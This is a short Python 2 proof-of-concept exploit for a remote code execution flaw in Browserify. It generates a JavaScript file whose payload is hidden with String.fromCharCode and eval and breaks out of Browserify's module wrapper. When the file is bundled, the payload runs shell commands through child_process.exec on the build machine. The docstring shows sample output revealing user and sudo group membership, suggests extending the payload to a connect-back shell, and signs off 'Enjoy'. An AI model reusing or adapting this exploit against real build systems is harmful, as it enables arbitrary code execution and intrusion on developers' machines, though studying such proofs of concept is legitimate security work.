#!/usr/bin/python
 
"""
Browserify POC exploit

http://iops.io/blog/browserify-rce-vulnerability/
 
To run, just do:
 
$ python poc.py > exploit.js
$ browserify exploit.js
BITCH I TOLD YOU THIS SHIT IS FABULOUS
[[garbage output]]
},{}]},{},[1]) 00:08:32 up 12:29,  3 users,  load average: 0.00, 0.02, 0.05
uid=1001(foxx) gid=1001(foxx) groups=1001(foxx),27(sudo),105(fuse)
 
You can also spawn() and create a connect back shell.
 
Enjoy
 
"""
 
def charencode(string):
    encoded=''
    for char in string:
        encoded=encoded+","+str(ord(char))
    return encoded[1:]
 
plaintext = """
   var require = this.process.mainModule.require;
   var sys = require('sys')
   var exec = require('child_process').exec;
   function puts(error, stdout, stderr) { sys.puts(stdout) }
   exec("uptime && id", puts);
   console.log("BITCH I TOLD YOU THIS SHIT IS FABULOUS");
"""
 
payload = charencode(plaintext)
final = "eval(String.fromCharCode(%s));" %(payload)
 
print "});"
print final
print "(function(){"